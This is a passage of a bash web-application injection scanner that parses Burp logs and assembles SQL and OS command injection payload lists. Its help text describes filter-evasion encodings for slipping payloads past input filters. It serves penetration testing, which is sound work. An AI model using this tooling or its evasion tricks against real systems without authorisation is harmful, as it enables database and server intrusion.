			#echo "final amount is $asciinumber"
			decasciiconv
			echo -n "$output"
			nambuf="$nambuf$output"
			if [ true = "$Z" ] ; then echo "DEBUG! MATCH on: $output $request" ;fi
			((oflag=$oflag+1))	
		done
		echo ""
		if [[ $nambuf != "" ]] ; then 
			remessage="$findme: $nambuf"
			echoreporter
			extract=1
		fi
	fi
done
#extra fi for end of checkflag if statement:
fi
}


decasciiconv()
{
output=""
case $asciinumber in 
32) output=" " ;;
33) output="!" ;;
34) output=" " ;;
35) output="#" ;;
36) output="$" ;;
37) output="%" ;;
38) output="&" ;;
39) output="'" ;;
40) output=" " ;;
41) output=" " ;;
42) output="*" ;;
43) output="+" ;;
44) output="," ;;
45) output="-" ;;
46) output="." ;;
47) output="/" ;;
48) output=0 ;;
49) output=1 ;;
50) output=2 ;;
51) output=3 ;;
52) output=4 ;;
53) output=5 ;;
54) output=6 ;;
55) output=7 ;;
56) output=8 ;;
57) output=9 ;;
58) output=":" ;;
59) output=";" ;;
60) output="<" ;;
61) output="=" ;;
62) output=">" ;;
63) output="?" ;;
64) output="@" ;;
65) output=A ;;
66) output=B ;;
67) output=C ;;
68) output=D ;;
69) output=E ;;
70) output=F ;;
71) output=G ;;
72) output=H ;;
73) output=I ;;
74) output=J ;;
75) output=K ;;
76) output=L ;;
77) output=M ;;
78) output=N ;;
79) output=O ;;
80) output=P ;;
81) output=Q ;;
82) output=R ;;
83) output=S ;;
84) output=T ;;
85) output=U ;;
86) output=V ;;
87) output=W ;;
88) output=X ;;
89) output=Y ;;
90) output=Z ;;
91) output="[" ;;
92) output=" " ;;
93) output="]" ;;
94) output="^" ;;
95) output="_" ;;
96) output=" " ;;
97) output=a ;;
98) output=b ;;
99) output=c ;;
100) output=d ;;
101) output=e ;;
102) output=f ;;
103) output=g ;;
104) output=h ;;
105) output=i ;;
106) output=j ;;
107) output=k ;;
108) output=l ;;
109) output=m ;;
110) output=n ;;
111) output=o ;;
112) output=p ;;
113) output=q ;;
114) output=r ;;
115) output=s ;;
116) output=t ;;
117) output=u ;;
118) output=v ;;
119) output="w" ;;
120) output=x ;;
121) output=y ;;
122) output=z ;;
123) output="{" ;;
124) output="|" ;;
125) output="}" ;;
126) output="~" ;;
esac
}


##### END OF FUNCTION DEFINITIONS SECTION ######	
#remove any residual files left lying about: 
rm cleanscannerinputlist.txt 2>/dev/null
rm 0 2>/dev/null
rm dump 2>/dev/null
rm dumpfile 2>/dev/null
rm search.txt 2>/dev/null
rm scannerinputlist.txt 2>/dev/null
rm 1scannerinputlist.txt 2>/dev/null
rm search.txt 2>/dev/null
rm dumpfile 2>/dev/null
rm dump 2>/dev/null
rm 2scannerinputlist.txt 2>/dev/null
rm dump.txt.txt 2>/dev/null
rm parameters_to_skip.txt 2>/dev/null
rm payloads.txt 2>/dev/null
rm outputheader.txt 2>/dev/null
rm search.txt 2>/dev/null


#initialise some of the logic flags to false:
n=false
s=false
q=false
m=false
e=false
h=false
x=false
u=false
curlproxy=""
P=false
b=false
C=false
f=false
o=false
D=false
G=false
H=false
Z=false
Y=false
V=false
U=false
O=false
K=false
J=false
N=false
g=false
m=false
p=false
w=false
z=false

#################command switch parser section#########################
#available: g,y (problematic),z

while getopts l:c:t:nsqehx:d:bu:P:v:L:M:Q:I:T:C:rWS:ABjYfoD:FGHRZVUOKJENakmpwyz: namer; do
    case $namer in 
    l)  #path to burp log to parse
        burplog=$OPTARG
        ;;
    D)  #back end dbms
	D=true
        dbms=$OPTARG
        ;;
    o)  #OVERRIDE NON TESTING OF LOGIN
	o=true
        ;;
    c)  #cookie to add to requests
        cookie=$OPTARG
        ;;
    t)  #target hostname/ip
        uhostname=$OPTARG
        ;;    
    T)  #url to test a connection to
        T=true
	testurl=$OPTARG
        ;;
    n)  #use numeric injection payloads
        n=true
        ;;
    f)  #fulsh out the session file
        f=true
        ;;
    s)  #use string injection payloads
        s=true
        ;;
    q)  #use quote injection payloads 
        q=true
        ;;
    r)  #use encoded quote injection payloads 
        r=true
        ;;
    e)  #use SQL time delay injection payloads 
        e=true
        ;;
    b)  #use OS command injection delay payloads
        b=true
        ;;     
    h)  #help!
        h=true
        ;;
    x) # time delay duration
        x=true
	timedelayduration=$OPTARG
        ;;
    d) # default error string used to ID a default error page
        d=true
	ErrorString=$OPTARG
        ;;
    j) # default error string used to ID a default error page
        j=true
	 ;;
    A) # null mode
        A=true
        ;;  
    B) # CRLF mode
        B=true
        ;;  
    v) # set a curl proxy
        v=true
	curlproxy=$OPTARG
        ;;
    P) # parse the log and create an input file
        P=true
	parseOutputFile=$OPTARG
        ;;    
    I) # Use an input file file, not a burp log
        I=true
	inputFile=$OPTARG
        ;;    
    L) # Session cookie liveness check GET URL
        L=true
	canaryRequest=$OPTARG
        ;;
    M) # Session cookie liveness check search string
        M=true
	canaryRequestSearchString=$OPTARG
        ;;
    Q) # Session cookie liveness check search string
        Q=true
	resumeline=$OPTARG
        ;;    
    C) # Custom payload list
        C=true
	custompayloadlist=$OPTARG
        ;;
    W) # Method swapping mode
        W=true
        ;;
    S) # parameters to skip
        S=true
	parameterstoskip=$OPTARG
        ;;
#	Y) # parameters to skip
#    	Y=true
#	;;
    F) # Dont skip params that have already been scanned
        F=true
	;;
    G) # Dont perform the normal connection test
        G=true
	;;
    a) # add a header
        a=true
	headertoadd=$OPTARG
	;;
    R) # RESTful parameters mode. F is set to true to override parameter skipping - as we cannot detect a page, we cannot apply param skipping 
        R=true
	F=true  
	;;
    Z) # DEBUG mode activated
	Z=true  
	;;
    Y) # Filter Evasion SQL comments for spaces
	Y=true  
	;;
    V) # Filter Evasion double URL encoding
	V=true  
	;;
    U) # Filter Evasion cAmEl cAsE
	U=true  
	;;
    O) # Filter Evasion MYSQL comments in SQL commands
	O=true  
	;;
    K) # ??? wtf -K does not work???
	K=true  
	;;
    J) # Filter Evasion nesting 'select' => 'selselectect'
	J=true  
	;;
    E) # Filter Evasion '=' => 'like'
	E=true  
	;;
    N) # Filter Evasion Intermediary chars ' ' => '%2f%2a%0B%0C%0D%0A%09%2a%2f'
	N=true  
	;;
    m) # UTF8 full-width quote ''' => '%EF%BC%87'
	m=true  
	;;
    p) # hash + noise + newline
	p=true  
	;;
    w) # comment + newline
	w=true  
	;;
    z) # Multi Byte Quote
	z=true  
	;;
    esac
done

# help mode activated
if [ true = "$h" ] || ["$1" == ""] 2>/dev/null ; then
	echo "$0 - A wrapper for curl written in bash :-)"
	echo "Written by Toby Clarke"
	echo "Influenced by code written by Brian Holyfield"
	echo "Common errors strings taken from Adam Muntner's fuzzdb regex/errors.txt"
	echo "Filter evasion ideas taken from sqlmap's tamper scripts"
	echo "Required arguments:"
	echo "  -t <host> Target hostname or IP address. No trailing slash."
	echo "AND one of:"
	echo "  -l <burplog> Path to the burp log file that will be parsed for requests. NOT a burp state file, but a log created in Burp > options > logging"
	echo "  -I <input file to use> Parse an input file, not a burp log. Input files can be created using the -P switch"
	echo "OR just:" 
	echo "  -T <test URL> Test mode: define a test URL to attempt a connection to. Also may require -c <cookie> to connect"
	echo "OR:"
	echo "  -P <input file to create> Parse mode: create an input file from a burp log. This can subsequently be scanned using the -I option. Also requires -l <burplog> to parse"	
	echo "AND one or more of the following payload types:"
	echo "  -s String injection"
	echo "  -n Numeric injection"
	echo "  -sn String and numeric injection"
	echo "  -q Quote injection"	
	echo "  -r Quote injection with various encodings"	
	echo "  -e SQL delay injection"
        echo "  -b OS Command injection"
        echo "  -eb SQL delay injection and OS Command injection"
        echo "  -C <path to payload list text file> Use a custom payload list. Where the character 'X' is included in a payload, it may be replaced with a time delay value."
        #echo "  -Y XSS injection (very basic!)"
	echo "Optional payload modifiers:             Before     After                         DBMS       "
	echo "  -Y Inline SQL comment space           ' '        '/*d*/'                       All        "
	echo "  -N Intermediary chars space           ' '        '%2f%2a%0B%0C%0D%0A%09%2a%2f' All        "              
	echo "  -p Hash+noise+newline space           ' '        '#ihffeg%0a'                  MYSQL      "
	echo "  -w Comment+newline space              ' '        '%2d%2d%0a'                   MYSQL,MSSQL"
	echo "  -m UTF-8 full-width quote             '''        '%EF%BC%87'                   All        "
	echo "  -z Multi-byte quote                   '''        '%bf%27'                      MYSQL      "
	echo "  -U Case variation                     'select'   'sElEcT'                      All        "
	#echo "  -O MYSQL inline comments             'select'   'se/**/lect'                  MYSQL "
	echo "  -E Replace equals operator with like  '='        'like'                        All        "
	echo "  -J Nesting                            'select'   'selselectect'                All        "
	echo "  -O URI unicode encoding               'or'       '%u006f%u0072'                All        "
	echo "  -V Double URL encoding                '%27'      '%2527'                       All        "
	echo "  -A Prepend payloads with %00"
	echo "  -B Prepend payloads with %0d%0a"
	echo "  -W HTTP Method Swapping mode: GET requests are converted to POSTs and vice-versa. These new requests are tested IN ADDITION to the original."
	echo "Various extra options:"
	echo "  -c <cookie> Add cookies. Enclose in single quotes: -c 'foo=bar'. Multiple cookies must be defined without spaces: -c 'foo=bar;sna=fu'"
	echo "  -a <headername:headervalue> Add a header like this (basic HTTP auth) example: -a 'Authorization: Basic d2ViZ29hdDp3ZWJnb2F0'"	
	echo "  -D <mssql, oracle, mysql> Specify a back end DBMS if known. Reduces the number of payloads. Options are currently mssql, oracle or mysql"
	echo "  -x <delay in seconds> Time delay for MS-SQL and command injection. Minimum value is 6. If not provided, default value is $timedelayduration seconds"
	echo "  -d <default error string> Define a detection string (inside double quotes) to identify a default error page"
	echo "  -v <add any curl command line option here> some examples below:"
	echo "  -v -L     Follow 302 redirects - scan the destination URL provided in a 302 redirect"
	echo "  -v -3     Force SSL v3 - can be used if you get an error like this: SSL23_GET_SERVER_HELLO:reason(1112)"
	echo "  -v <http://proxy:port> Define a proxy. Currently, I crash burp. Dont know why."
	echo "  -L <URL of session liveness check page> Conduct an access check on a given page to determine the session cookie is valid"	
        echo "  -M <Search string> String to search for in session liveness check page. Replace spaces with periods: 'Welcome user Bob' should be 'Welcome.user.Bob'"
        echo "  -Q <Request number> Resume a halted scan at a given request number"        
	echo "  -T <Test URL> Test mode: define a test URL to attempt a connection to. Also may require -c <cookie> to connect"
	echo "  -S <file containing parameters to skip, each parameter on a seperate line> Define one or many parameters NOT to scan"
	echo "  -o Override the typical behaviour of excluding any requests which include the following phrases: logoff, logout, exit, signout, delete, signoff"
	echo "  -F Override the typical behaviour of skipping parameters that have already been scanned. Increases scan time, but scans every parameter of every request"
	#echo "  -R RESTful paramters - horribly broken: do not use"
	echo "  -Z DEBUG mode - very verbose output - useful for script debugging"
	echo "Some examples:"
	echo "String and numeric SQL injection scan based on a burp log:"
	echo "  $0 -t http://www.foo.bar -l example-burp.log -sn"
	echo "Using Parse mode to create an input file from a burp log file:"
	echo "  $0 -l example-burp.log -P example-burp.input"
	echo "Runtime hints: CNTRL+c to skip to the end of the current loop iteration, CNTRL+z to stop scanning altogether, re-run with the same values to resume an incomplete scan"	
	exit
fi

#beginning of user input sanity checking section

if [[ true == "$x" ]] ; then
	if ((timedelayduration<6)) ; then
		timedelayduration=6
		echo "Overiding provided duration: setting MS-SQL time delay amount to the minimum value of 6 seconds, as time differences of 5 seconds and less are ignored to reduce false positives."
	fi
fi

#prevent users from combining length-diffing and time-diffing scans:
if [[ true == "$s" || true == "$n" || true == "$sn" ]] ; then
	if [[ true == "$e" || true == "$b" || true == "$eb" ]]; then
		echo "FATAL: Cannot combine length-diffing (s, n, sn) and time-diffing (e, b, eb) scans" >&2
		echo "Either run: -s, -n, -sn, OR -e, -b, eb" >&2
		exit
	fi
fi

#a header has been specified
if [[ true == "$a" ]] ; then
	echo "Adding header $headertoadd"
	headertoset="$headertoadd"
fi


#no burplog or input file specified:
if [[ "$burplog" == "" && "$inputFile" == "" && "$testurl" == "" ]] ; then
	echo "FATAL: I need a burplog or an input file to parse." >&2
	echo "-l <burplog> or -I <input file>">&2
	exit
fi

#no hostname provided:
if [[ "$uhostname" == "" && "$burplog" == "" && "$testurl" == "" ]]; then
	echo "FATAL: I need a hostname (no trailing slash)." >&2
	echo "-t <host>">&2
	exit
fi

#hostname has a trailing slash:
lastchar="${uhostname: -1}"
if [[ "$lastchar" == "/" ]] ; then
	echo "FATAL: hostname $uhostname has a trailing slash. Please re-run the scan and remove the slash at the end of the hostname."
	exit
fi

#if we are not creating an input file from a burp log (-P), and no payloads have been specified, ask for a payload:
if [[ true != "$P" && true != "$T" && true != "$s" && true != "$n" && true != "$q" && true != "$e" && true != "$b" && true != "$C" && true != "$r" && true != "$j" ]]; then
	echo "FATAL: I need a payload type" >&2
	echo "Some examples are: -s, -n, -q, -r, -e, -b, -C" >&2
	exit
fi

# this fixes weird behaviour if no cookie value is given by setting a stupid cookie
if [[ "$cookie" == "" ]]; then
	echo "Cookie not provided. Setting cookie to foo=bar" >&2
	cookie="foo=bar"
fi

safefilename=`echo $uhostname-$(date)| replace " " "-" | replace "//" "" | replace ":" "."`
safehostname=`echo $uhostname | replace " " "-" | replace "//" "" | replace ":" "."`

#this just sets curls -k option which means that it will handle cert errors without borking
protocol=`echo $uhostname| cut -d ":" -f 1` 
if [[ "$protocol" == "https" ]]; then
	httpssupport="-k"
else
	httpssupport=""	
fi

#unless we are using an .input file, the safelogname should be the $burplog path value
if [[ true != "$I" ]]; then
	safelogname=`echo $burplog | replace " " "" | replace "/" "-" | replace ":" "-" | replace '\' ''| replace "." "_" `
else
	safelogname=`echo $inputFile | replace " " "" | replace "/" "-" | replace ":" "-" | replace '\' ''| replace "." "_" `
fi

###check for previous scan reports
includereports=0
fooa=`ls ./output/$safelogname$safehostname* 2>/dev/null | wc -l`
if [[ "$fooa" != "0" ]] ; then
	echo "Prior report files found:"
	fooa=`ls ./output/$safelogname$safehostname*`
	echo "$fooa"
	echo -n "Enter y at the prompt to include prior reports in output or n to ignore them: "
	read choice
	if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
		echo "Including prior reports"
		includereports=1		
	else 
		echo "Ignoring prior reports"
	fi
fi

### session file checking / creation code ###
# the idea here is that the user should be happy killing and resuming a scan.
# this is facilitated by saving the scan progress (specifically the request 
# or "URL number" last scanned) in a session file and then checking for the 
# presence of this file whenever a scan is launched

if [ true != "$Q" ] ; then
	#echo "Checking for session file."
	if [ true = "$f" ] ; then
		rm ./session/$safelogname.$safehostname.session.txt 2>/dev/null
	fi
	session=''
	session=`cat ./session/$safelogname.$safehostname.session.txt 2>/dev/null`
	if [[ "$session" != "" ]]; then
		echo "Session file found at ./session/$safelogname.$safehostname.session.txt"
		echo "Looks like you've scanned this host before." 	
		echo "Do you want to resume from the last URL scanned: ($session)?"
		echo -n "Enter y at the prompt to resume from URL $session or n to start from the first URL: "
		read choice
		if [[ "$choice" == "y" ]]; then
			echo "Resuming scan from URL $session"		
			resumeline=$session
			Q=true
		else 
			echo "Starting from the first URL"
			resumeline=0
		fi
		# put your input file recovery code here 
		#echo "Session file found at ./session/$safelogname.$safehostname.session.txt"
		#./session/$safelogname.$safehostname.input
		#echo "Checking for .input file"
		inputCheck=`wc ./session/$safelogname.$safehostname.input 2>/dev/null` 
		if [[ "$inputCheck!" != "" ]] ; then
			echo "Input file found at ./session/$safelogname.$safehostname.input"
			echo -n "Enter n at the prompt to create a fresh .input file or y to use the previously created .input file: "
			read choice
			if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
				echo "Re-using the .input file at ./session/$safelogname.$safehostname.input"		
				I=true
				inputFile="./session/$safelogname.$safehostname.input"
			else 
				echo "Creating a fresh .input file from the burp log"
			fi
		fi
	else 
		echo "Session file not found. Creating ./session/$safelogname.$safehostname.session.txt and starting from the first URL"
	fi
else
	echo "Resuming scan at request $resumeline"
fi

elementreuse=0
xpathCheck=`cat ./output/$safelogname.$safehostname.xpath 2>/dev/null` 
if [[ "$xpathCheck" != "" ]] ; then
	echo "XPath element hierachy found at ./output/$safelogname.$safehostname.xpath"
	echo -n "Enter n at the prompt to create a fresh element hierachy file or y to use the previously created element hierachy file: "
	read choice
	if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
		echo "Re-using the element hierachy file at ./output/$safelogname.$safehostname.xpath"
		elementreuse=1		
	else 
		echo "Ignoring previous XPath element hierachy file"
	fi
fi

rm ./aggoutputlog.txt 2>/dev/null
rm ./alertmessage.txt 2>/dev/null
	
#################wget spider section#########################

#wget --mirror http://192.168.194.129/ -o ./wgetlog.txt -d --spider

#wget log parsing section#

#get="GET "
#post="POST "
#question="\?"
#N=0
#begin="---request begin---"
#end="---request end---"

#captureflag=0

#cat ./wgetlog.txt | while read LINE ; do
#	if [[ $LINE =~ $begin ]]; then
#		captureflag=1
#	fi
#	if [[ $LINE =~ $end ]]; then
#		captureflag=0
#	fi
#	if [ $captureflag == 1 ]; then
#		captureflag=0
#	fi


#################burplog parser section#########################

########BURPLOG PARSING SECTION############

#if the user hasn't provided an input file, or a test URL, they must have provided a burp log to parse: 
if [[ true != "$I" && true != "$T" ]] ; then
	rm 1scannerinputlist.txt 2>/dev/null
	rm scannerinputlist.txt 2>/dev/null
	rm ./multipartlist.txt 2>/dev/null

	burplines=`wc -l $burplog | cut -d " " -f 1`
	echo "Parsing burp log $burplog with $burplines lines"  
	if [[ $burplines == "" || $burplines == "0" ]] ; then
		echo "Fatal Error: Burp log provided has no lines: please check your settings."
		exit
	fi
		
	########BURPLOG ANALYSIS SECTION############

	N=0
	lineflag=0
	fileflag=0
	captureflag=0
	#the below get re-used later on in the code - dont change them
	#for some reason it seemed easier to define these and then match against the definition
	equalcheck="======================================================"
	get="GET "
	get2="GET"
	post="POST "
	post2="POST" 
	question="\?"
	colon=":"
	equals="="
	#initialise some variables:
	postflag=0
	postdataflag=0
	postURIflag=0
	multipartpost=0
	searchformultipartdata=0
	rm ./partlist.txt 2>/dev/null
	# this next block of code is a 'for' loop over the list of entries in the $burplog txt file.
	# its purpose is to translate a burp log into .input format, which is a list of lines like this:
	# GET /foobar.php?sna=fu 
	# if you use a 'for' loop in bash it treats spaces as delimiters by default - 'while | read' is 
	# one way to get bash to treat each line as a whole regardless of spaces
	cat $burplog | while read LINE ; do
		if [ $lineflag == 2 ]; then
			#two =========== lines gone past: this is the trigger to start capturing data"
			captureflag=1
			counter=$((counter+1))
		fi
	
		if [ $lineflag == 3 ]; then
			#three =========== lines gone past: this is the trigger to stop capturing data"
			captureflag=0		
			#reset the flag that counts the number of ============= lines that have passed by:
			lineflag=0
			#echo -n "."
			#we output multipart post details here as we are at the end of the request: 
			if [ $multipartpost == 1 ]; then
				out=`cat ./partlist.txt | tr -d "[:cntrl:]"`
				multipartpost=0
				searchformultipartdata=0
				#this is to chop off the trailing '&'
				len=${#out}
				lenminus1=$((len-1))
				mparams=${out:0:lenminus1}

				echo "POST" $outer"???"$mparams  >> 1scannerinputlist.txt
				echo "POST" $outer"???"$mparams 
				rm ./partlist.txt
			fi
 
		fi
		if [ $captureflag == 1 ]; then
		# we are capturing burp log info:
		# first question: is it a POST or GET request?
			#if [[ $LINE =~ $get && $LINE =~ $question ]]; then       # modified the below to allow URLs without ?'s for restful mode
			if [[ $LINE =~ $get ]]; then
				# GET detected the next line takes a line like:"
				# GET /foobar.asp?snafu=yep HTTP/1.1
				# and outputs:
				# GET /foobar.asp?snafu=yep				
				getline=`echo "$LINE" | cut -d " " -f 1,2`
				echo $getline >> 1scannerinputlist.txt
			fi
			#this code includes support for POST URI parameters:
			if [[ $LINE =~ $post && $LINE =~ $question ]]; then      
			# added the line below to allow URLs without ?'s for restful mode
			#if [[ $LINE =~ $post ]]; then             # this lead to errors tho so removed it again and restored the original
				# POST with URI parameters detected. Store in the 'outer' variable, a line such as:"
				# /foobar.asp?snafu=yep				
				outer=`echo "$LINE" | cut -d " " -f 2`;
				postflag=1
				postURIflag=1			
			fi
			if [[ $LINE =~ $post && !($LINE =~ $question) ]]; then
				# 'Normal' POST detected:
				# as before with the URI POST, we chop off the 'POST ' and 'HTTP/1.1' feilds either 
				# side of the URI, to store in the 'outer' variable something like:
				# /foobar.asp
				outer=`echo "$LINE" | cut -d " " -f 2`
				# raise the postflag: we are hunting for the postdata now:
				postflag=1
			fi
			if [ $postflag == 1 ]; then
				#this is my lame postdata matching condition:
				#the post data has an "=" and DOESENT have a ":" (keeps the headers away from the door...)
				#TODO sharpen this test up a bit!
				if [[ $LINE =~ $equals && !($LINE =~ $colon) && !($LINE =~ $question) && !($LINE =~ $equalcheck) ]]; then
 					if [ $postURIflag == 1 ]; then
						echo "POST" $outer"??"$LINE  >> 1scannerinputlist.txt
						# In the case of a POST with URI parameters, POST body parameters are preceded with ??, like this:
						# POST /foobar.aspx?URIparam=1??bodyparam=2
						postURIflag=0
					else
						echo "POST" $outer"?"$LINE  >> 1scannerinputlist.txt
						# In the case of a 'normal' POST request, POST body parameters are preceded with ?, like this:
						# POST /foobar.aspx?bodyparam=2
						
					fi
				#reset the post flag in preparation for parsing the next request:
				postflag=0
				fi
			fi
			#if we find a line like: Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOXye4QTitIZotFdn
			if [[ $LINE =~ "Content-Type" && $LINE =~ "multipart" && $LINE =~ "boundary" ]]; then
				#set the multipartpostflag for this request
				multipartpost=1
				#marker=`echo "$LINE" | cut -d "=" -f 2`
					
			fi
			if [ $multipartpost == 1 ]; then
				#if we find a line like: Content-Disposition: form-data; name="input1"
				if [[ $LINE =~ "Content-Disposition" && $LINE =~ "form-data" ]] ; then
					#store the name value such as input1 in the example line above
					#printf -v str 'Hello World\n===========\n'
					multipartname=`echo $LINE | cut -d "=" -f 2 | replace '"' ''`
					#now we are hunting for the multipart data, so set the flag:
					searchformultipartdata=1
					#store the current line number as the multipart data is in 2 lines:
					thelinenumer=$N
				fi
			fi
			#if we are hunting for the multipart data:
			if [ $searchformultipartdata == 1 ]; then
				#echo "MATCH"					
				#get the stored line number from above, and add 2:
				checkval=$((thelinenumer+2))
				#echo "compare: $N with: $checkval"
				#compare this value with the current line number:
				if [ $N == $checkval ]; then
					#if they match, grab the value of this line - its the multipart data:
					multipartval=($LINE)
					#stop hunting for multipart data:
					searchformultipartdata=0
					#concatenate the multipart name and data values to a text file 
					# - there could be one or more name value pairs: 
					#multiparams="$multipartname$multipartval$multiparams"
					echo $multipartname >> ./partlist.txt
					echo "="$multipartval  >> ./partlist.txt
					echo "&" >> ./partlist.txt
				fi 
			fi
		fi
		
		#if [ true = "$Z" ] ; then echo "Line $N = $LINE" ;fi
		if [[ $LINE =~ $equalcheck ]]; then
			# lineflag increments with long lines of '=' characters. burp logs use three of these lines to capture a single request.
			# when lineflag=1 we have a request, when lineflag=2 we capture the next line, when lineflag=3 we have seen the whole of the request: 
			# ======================================================
			# 1:50:18 PM  http://192.168.182.136:80
			# ======================================================
			# POST /dvwa/vulnerabilities/exec/ HTTP/1.1
			# Host: 192.168.182.136
			# Referer: http://192.168.182.136/dvwa/vulnerabilities/exec/
			# Cookie: security=high; PHPSESSID=67pq8ivtjaj485sbvck5fs8c87; acopendivids=phpbb2,redmine; acgroupswithpersist=nada
			# Content-Length: 20
			#	
			# ip=qwe&submit=submit
			# ======================================================
			lineflag=$((lineflag+1))
		fi
		N=$((N+1))
	done
	
	
	#cat 1scannerinputlist.txt
	#exit
	rm 2scannerinputlist.txt 2>/dev/null

	# if Method swapping has been specified, add a GET for each POST and vice-versa:
	# btw, if a POST request is normal (i.e. no URI params), then the body params are preceded by a single '?'
	# however, if a POST request has URI parameters, then these are preceded by a '?', while the POST body params are preceded by '??'
	if [ true = "$W" ] ; then
		cat 1scannerinputlist.txt | while read i;
			do methodical=`echo $i | cut -d " " -f 1`
			if [[ "$methodical" =~ "POST" ]]; then
				echo GET `echo $i | cut -d " " -f2 | replace '??' '&'` >> 2scannerinputlist.txt 
				echo POST `echo $i | cut -d " " -f2` >> 2scannerinputlist.txt
			else
				echo GET `echo $i | cut -d " " -f2` >> 2scannerinputlist.txt 
				echo POST `echo $i | cut -d " " -f2` >> 2scannerinputlist.txt
				#the above line causes GET params to be passed as POST body params, otherwide they'd be treated as POST URI params	
			fi
		done
	else 
		cp 1scannerinputlist.txt 2scannerinputlist.txt	
	fi

#cat 2scannerinputlist.txt
#exit
	#sort uniq the list and also clean out log entries that you dont want to be scanning:
	# note that this is now sort -r. hopefully this will reverse the sort list and cause POSTS to be scanned first :)
	cat 2scannerinputlist.txt | grep -v "\(\.png\|\.jpg\|\.css\|\.bmp\|\.gif\)" | sort -r | uniq > 3scannerinputlist.txt

	#need some code to double up the post reqs with params:
	#this is to support scanning of POST URIs
	#where a POST with URIs is found, first time it'll scan the POST URIs, next time it'll scan the POST data params. (or the other way round.. i cant remember)
	#hence we need duplicates of POST requests that have POST URIs.
	#this has to be done after the | sort | uniq
	cat 3scannerinputlist.txt | while read LINE; do
		echo -n "."
		echo $LINE >> scannerinputlist.txt
		#modded this to exclude multipart post forms: /foo.asp???bar=1:
		if [[ $LINE =~ $post && $LINE =~ $question$question && !($LINE =~ $question$question$question) ]]; then
			echo $LINE >> scannerinputlist.txt
		fi
	done

	#TODO: investigate this and the below if statement. 
	#get rid of any requests without ?'s unless F:
	if [[ true != "$R" ]]; then # ...unless F (override param skipping) is set:
		cat scannerinputlist.txt | while read LINE; do
			echo -n "."
			if [[ $LINE =~ $question ]]; then
				echo $LINE >> 4scannerinputlist.txt
			else
				uyrgf=1
			fi
		done
		cp 4scannerinputlist.txt scannerinputlist.txt
	fi
	
	#get rid of any requests WITH ?'s IF F:
	if [[ true == "$R" ]]; then # ...if F (override param skipping) is set:
		cat scannerinputlist.txt | while read LINE; do
			echo -n "."
			if [[ $LINE =~ $question ]]; then
				uyrgf=1
			else
				echo $LINE >> 4scannerinputlist.txt
			fi
		done
		cp 4scannerinputlist.txt scannerinputlist.txt
	fi
		
	#as 1scannerinputlist.txt (and its friends) is accumulative by nature, it must be cleared down 
	rm 1scannerinputlist.txt 2>/dev/null	
	rm 2scannerinputlist.txt 2>/dev/null	
	rm 3scannerinputlist.txt 2>/dev/null
	rm 4scannerinputlist.txt 2>/dev/null
fi
### done parsing the burplog - the output is in scannerinputlist.txt ###

#OPTIONAL URL connection testing routine:
if [ true = "$T" ] ; then
	echo "Testing connection to $testurl" 
	testresult=`curl $testurl -v -o testoutput.html --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w %{http_code}:%{size_download}`
	testresultstatus=`echo $testresult | cut -d ":" -f 1`
	testresultlength=`echo $testresult | cut -d ":" -f 2`
	echo "The status code was "$testresultstatus 
	echo "The response length was "$testresultlength
	echo "The output has been saved as testoutput.html" 
	exit
fi

#An input file has been specified:
if [ true = "$I" ] ; then
	rm scannerinputlist.txt 2>/dev/null
	echo "Parsing input file" $inputFile
	cat "$inputFile" | while read quack; do
		echo $quack >> scannerinputlist.txt
	done
	echo "Parsed input file $inputFile" 
fi

#as both the below lists are accumulative ny nature, they must first be cleared down before they are used:
rm cleanscannerinputlist.txt 2>/dev/null
rm exceptionlist.txt 2>/dev/null

if [ false = "$o" ] ; then
	#identify any risky request URLs
	cat scannerinputlist.txt | while read quack; do
		textsearch=`echo $quack | grep -i "\(logoff\|login\|logout\|exit\|signout\|delete\|signoff\|password\)"`
		if [[ "$textsearch" != "" ]] ; then
			echo $quack >> exceptionlist.txt
		else
			echo $quack >> cleanscannerinputlist.txt
			echo -n "."
		fi
	done
else
	cp scannerinputlist.txt cleanscannerinputlist.txt;
fi

# the user wants to parse the burplog and create a .input file
if [ true = "$P" ] ; then
	cat cleanscannerinputlist.txt | while read quack; do
		echo $quack >> $parseOutputFile
	done
	echo "Input file $parseOutputFile created"
	echo "The following potentially risky URLs (if any) were removed: " >> urltested.txt
	cat exceptionlist.txt >> urltested.txt
	echo "	*	*	*	*	*	*" >> urltested.txt
	echo "The following URLs were added: " >> urltested.txt
	cat cleanscannerinputlist.txt >> urltested.txt
	cat urltested.txt
	rm urltested.txt 2>/dev/null	
	exit
fi

entries=`wc -l cleanscannerinputlist.txt | cut -d " " -f 1`

#cat cleanscannerinputlist.txt

echo ""
echo "Scan list created with $entries entries" 
echo "Saving a .input file (including risky requests) to: ./session/$safelogname.$safehostname.input" 
cp scannerinputlist.txt ./session/$safelogname.$safehostname.input

rm scannerinputlist.txt 2>/dev/null


#echo "debugGOT  HERE"
#exit

exceptions=`cat exceptionlist.txt 2>/dev/null`
if [[ "$exceptions" != "" ]] ; then
	cat exceptionlist.txt 2>/dev/null 
	echo "The URLs listed above are potentially risky and will be excluded from scanning. Run the scan again using the -o option to include them."
	echo -n "Enter y to continue or n to quit: "
	read keyinput
		if [[ "$keyinput" == "n" ]] ; then
		exit;
	fi
fi

rm exceptionlist.txt 2>/dev/null

#######Prep the param list section########

#the output of this section will be a list of payloads called payloads.txt

#clear down the payloads.txt list incase it has entries left in it
rm payloads.txt 2>/dev/null

##this section concatenates payload list files based on user input###

if [ true = "$s" ] ; then
	if [ true = "$D" ] ; then	
		cat ./payloads/stringpayloads.$dbms.txt | while read quack; do
			echo $quack >> payloads.txt
		done
	else
		cat ./payloads/stringpayloads.txt | while read quack; do
			echo $quack >> payloads.txt
		done
	fi
fi

if [ true = "$n" ] ; then
	cat ./payloads/numericpayloads.txt | while read quack; do
		echo $quack >> payloads.txt
	done
fi	

if [ true = "$e" ] ; then
	if [ true = "$D" ] ; then	
		cat ./payloads/timedelaypayloads.$dbms.txt | while read quack; do
			echo $quack | replace "X" $timedelayduration >> payloads.txt
		done
	else
		cat ./payloads/timedelaypayloads.txt | while read quack; do
			echo $quack | replace "X" $timedelayduration >> payloads.txt
		done
	fi
fi

if [ true = "$b" ] ; then
	cat ./payloads/commandpayloads.txt | while read quack; do		
		echo $quack | replace "X" $timedelayduration >> payloads.txt
	done
fi

if [ true = "$q" ] ; then
	cat ./payloads/quotepayloads.txt | while read quack; do
		echo $quack >> payloads.txt
	done
fi

if [ true = "$j" ] ; then
